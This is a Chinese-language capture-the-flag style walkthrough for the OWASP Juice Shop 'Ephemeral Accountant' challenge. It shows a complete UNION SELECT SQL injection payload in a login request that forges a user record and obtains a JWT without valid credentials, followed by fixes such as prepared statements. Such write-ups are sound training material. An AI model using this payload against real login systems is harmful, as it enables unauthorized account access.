# Juice-Shop 攻略：临时会计

## 挑战概述

**标题：** Ephemeral Accountant  
**类别：** 注入  
**难度：** ⭐⭐⭐⭐ (4/6)

本挑战要求使用 SQL 注入，模拟登录一个不存在但临时创建的用户 `"acc0unt4nt@juice-sh.op"`，而不将该账户永久写入数据库。

## 使用的工具

- **拦截代理（如 Burp Suite）：** 用于捕获和修改 HTTP 请求。

## 方法与解法

### 步骤 1：分析登录功能

首先，我捕获了常见的登录 HTTP POST 请求，内容大致如下：

```http
POST /rest/user/login HTTP/1.1
Host: 127.0.0.1:3000
Content-Type: application/json

{
  "email": "user@example.com",
  "password": "password123"
}
```

### 步骤 2：构造 SQL 注入载荷

考虑到挑战要求（不实际创建账户，也不永久修改数据库），我选择使用 SQL 注入和 `UNION SELECT` 策略，在查询执行期间临时模拟账户存在。

### 步骤 3：在 SQL 查询中注入临时用户

我修改了登录请求载荷，通过 UNION SELECT 子查询构造一条模拟合法用户记录：

```http
POST /rest/user/login HTTP/1.1
Host: 127.0.0.1:3000
Content-Type: application/json

{
  "email": "' UNION SELECT * FROM (SELECT 20 AS `id`, 'acc0unt4nt@juice-sh.op' AS `username`, 'acc0unt4nt@juice-sh.op' AS `email`, 'test1234' AS `password`, 'accounting' AS `role`, '123' AS `deluxeToken`, '1.2.3.4' AS `lastLoginIp`, '/assets/public/images/uploads/default.svg' AS `profileImage`, '' AS `totpSecret`, 1 AS `isActive`, 12983283 AS `createdAt`, 133424 AS `updatedAt`, NULL AS `deletedAt`) AS tmp WHERE '1'='1';--",
  "password": "test1234"
}
```

可以看到，服务器返回了 JWT token，这意味着登录成功：

<img src="../assets/difficulty4/ephemeral_accountant_2.png" alt="decrypting coupons" width="500px">

### 解法说明

这次 SQL 注入在查询执行期间有效地创建了一条临时数据库记录。`UNION SELECT` 子句构造了一个完整用户记录，与应用登录逻辑所需的结构相匹配。将注入中的 `email` 字段设置为与 SQL 查询预期值一致后，应用就会像处理数据库中真实存在的用户一样处理这个“临时”用户。

`WHERE '1'='1'` 条件确保注入始终匹配查询上下文，而注释 `--` 则确保真实 SQL 查询后续部分被忽略。

### 修复建议

- **使用预处理语句：** 始终使用参数化查询或预处理语句处理 SQL 查询。这样可确保 SQL 执行引擎将输入视为数据而非可执行代码。
- **在 SQL Server 端验证：** 确保用户登录时对应账户确实存在于数据库中，并在服务器端再次核验。
- **输入验证：** 严格验证所有用户输入，降低注入风险。输入应符合预期格式并经过清理。
